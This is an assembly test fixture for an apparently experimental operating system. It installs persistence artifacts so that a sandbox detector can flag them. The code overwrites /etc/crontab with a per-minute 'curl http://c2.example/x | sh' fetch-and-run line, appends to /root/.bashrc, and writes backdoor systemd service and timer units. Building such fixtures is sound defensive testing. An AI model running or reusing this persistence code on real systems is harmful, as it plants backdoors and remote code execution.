/* sotOs · γ · Stage 7 demo · C-static fixture (asm).
 *
 * Exercises the F_persistence path: a Tier-2 sotbox writes to 4 sensitive
 * paths (crontab / bashrc / unit file / timer file).  Lucas detects the
 * paths via path_matcher and sets SOTFS_HINT_FUNCTOR_PERSISTENCE, which
 * sotfs applies to the inode.  Post-simreboot the lie survives.
 *
 * Hand-derived asm · no libc · static ELF · committed binary.
 *
 * Build:
 *   gcc -no-pie -nostdlib -static -Wl,--build-id=none \
 *       -o stage7_demo.bin stage7_demo.S
 *   strip stage7_demo.bin
 */
.section .text
.global _start
_start:
    /* write(2, banner, banner_len) · stderr */
    mov $1, %rax
    mov $2, %rdi
    lea banner(%rip), %rsi
    mov $banner_len, %rdx
    syscall

    /* ============================================================ */
    /* 1. /etc/crontab · O_CREAT|O_WRONLY|O_TRUNC = 0x241 · mode 0644 */
    /* ============================================================ */
    mov $2, %rax
    lea path_crontab(%rip), %rdi
    mov $0x241, %rsi
    mov $0644, %rdx
    syscall
    test %rax, %rax
    js   .Lskip_crontab
    mov %rax, %r12          /* save fd */
    /* write(fd, content, len) */
    mov $1, %rax
    mov %r12, %rdi
    lea body_crontab(%rip), %rsi
    mov $body_crontab_len, %rdx
    syscall
    /* close(fd) */
    mov $3, %rax
    mov %r12, %rdi
    syscall
    /* announce */
    mov $1, %rax
    mov $2, %rdi
    lea msg_crontab(%rip), %rsi
    mov $msg_crontab_len, %rdx
    syscall
.Lskip_crontab:

    /* ============================================================ */
    /* 2. /root/.bashrc · O_CREAT|O_WRONLY|O_APPEND = 0x441 · 0644   */
    /* ============================================================ */
    mov $2, %rax
    lea path_bashrc(%rip), %rdi
    mov $0x441, %rsi
    mov $0644, %rdx
    syscall
    test %rax, %rax
    js   .Lskip_bashrc
    mov %rax, %r12
    mov $1, %rax
    mov %r12, %rdi
    lea body_bashrc(%rip), %rsi
    mov $body_bashrc_len, %rdx
    syscall
    mov $3, %rax
    mov %r12, %rdi
    syscall
    mov $1, %rax
    mov $2, %rdi
    lea msg_bashrc(%rip), %rsi
    mov $msg_bashrc_len, %rdx
    syscall
.Lskip_bashrc:

    /* ============================================================ */
    /* 3. /etc/systemd/system/backdoor.service · 0x241 · 0644        */
    /* ============================================================ */
    mov $2, %rax
    lea path_service(%rip), %rdi
    mov $0x241, %rsi
    mov $0644, %rdx
    syscall
    test %rax, %rax
    js   .Lskip_service
    mov %rax, %r12
    mov $1, %rax
    mov %r12, %rdi
    lea body_service(%rip), %rsi
    mov $body_service_len, %rdx
    syscall
    mov $3, %rax
    mov %r12, %rdi
    syscall
    mov $1, %rax
    mov $2, %rdi
    lea msg_service(%rip), %rsi
    mov $msg_service_len, %rdx
    syscall
.Lskip_service:

    /* ============================================================ */
    /* 4. /etc/systemd/system/backdoor.timer · 0x241 · 0644          */
    /* ============================================================ */
    mov $2, %rax
    lea path_timer(%rip), %rdi
    mov $0x241, %rsi
    mov $0644, %rdx
    syscall
    test %rax, %rax
    js   .Lskip_timer
    mov %rax, %r12
    mov $1, %rax
    mov %r12, %rdi
    lea body_timer(%rip), %rsi
    mov $body_timer_len, %rdx
    syscall
    mov $3, %rax
    mov %r12, %rdi
    syscall
    mov $1, %rax
    mov $2, %rdi
    lea msg_timer(%rip), %rsi
    mov $msg_timer_len, %rdx
    syscall
.Lskip_timer:

    /* Final marker */
    mov $1, %rax
    mov $2, %rdi
    lea done_msg(%rip), %rsi
    mov $done_msg_len, %rdx
    syscall

    /* exit_group(0) */
    mov $231, %rax
    xor %rdi, %rdi
    syscall
    ud2

.section .rodata
banner:
    .ascii "[stage7-c] alive · running F_persistence install demo\n"
banner_len      = . - banner

/* --- 1. /etc/crontab ------------------------------------------- */
path_crontab:
    .ascii "/etc/crontab"
    .byte 0
body_crontab:
    .ascii "* * * * * /bin/sh -c 'curl http://c2.example/x | sh'\n"
body_crontab_len = . - body_crontab
msg_crontab:
    .ascii "[stage7-c] crontab written · /etc/crontab\n"
msg_crontab_len = . - msg_crontab

/* --- 2. /root/.bashrc ------------------------------------------ */
path_bashrc:
    .ascii "/root/.bashrc"
    .byte 0
body_bashrc:
    .ascii "\nexport BACKDOOR=/usr/local/evil\n"
body_bashrc_len = . - body_bashrc
msg_bashrc:
    .ascii "[stage7-c] bashrc appended · /root/.bashrc\n"
msg_bashrc_len = . - msg_bashrc

/* --- 3. /etc/systemd/system/backdoor.service ------------------- */
path_service:
    .ascii "/etc/systemd/system/backdoor.service"
    .byte 0
body_service:
    .ascii "[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/usr/local/evil --daemon\n"
body_service_len = . - body_service
msg_service:
    .ascii "[stage7-c] service written · /etc/systemd/system/backdoor.service\n"
msg_service_len = . - msg_service

/* --- 4. /etc/systemd/system/backdoor.timer --------------------- */
path_timer:
    .ascii "/etc/systemd/system/backdoor.timer"
    .byte 0
body_timer:
    .ascii "[Unit]\nDescription=Backdoor tick\n[Timer]\nOnUnitActiveSec=60s\nUnit=backdoor.service\n"
body_timer_len = . - body_timer
msg_timer:
    .ascii "[stage7-c] timer written · /etc/systemd/system/backdoor.timer\n"
msg_timer_len = . - msg_timer

done_msg:
    .ascii "[stage7-c] === STAGE 7 complete · operator: simreboot + verify ===\n"
done_msg_len    = . - done_msg
